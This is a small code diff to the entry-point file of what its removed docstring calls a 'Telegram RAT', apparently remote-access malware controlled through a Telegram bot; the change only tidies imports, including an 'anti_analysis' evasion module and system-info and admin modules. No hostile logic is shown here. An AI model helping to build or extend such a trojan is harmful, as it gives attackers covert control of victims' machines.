@@ -1,14 +1,11 @@
-"""Telegram RAT entry point."""
 import sys
 import os
+import logging
 
-# Ensure modules package is importable
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-from modules.main import bot, ADMIN_ID
+from modules.main import bot, ADMIN_ID, sysinfo, main_kb
 from modules.anti import anti_analysis
-from modules.main import sysinfo, main_kb
-import logging
 
 log = logging.getLogger("rat")
 
